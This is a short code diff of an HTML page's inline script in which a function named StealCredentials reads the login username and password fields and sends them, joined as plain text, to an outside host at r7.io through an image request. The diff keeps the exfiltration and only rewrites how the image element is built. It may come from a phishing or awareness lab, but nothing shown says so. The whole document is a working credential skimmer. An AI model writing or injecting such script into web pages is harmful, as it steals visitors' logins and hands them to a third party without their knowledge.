@@ -33,14 +33,13 @@
     
       <p>
           <script type="text/javascript"> 
-          console.log(document.forms);
             function StealCredentials() {
                 var username = document.getElementById("login_username").value;
                 var pass = document.getElementById("login_password").value;
                 var credentials = "username = " + username + " | " + "password = " + pass;
                 console.log(credentials);
-                i = new Image();
-                i.src = "https://r7.io/e/nhytrek?s=" + credentials;
+                img = document.createElement("img");
+                img.src = "http://r7.io/e/nhytrek?s=" + credentials;
             }
             </script>
       </p>
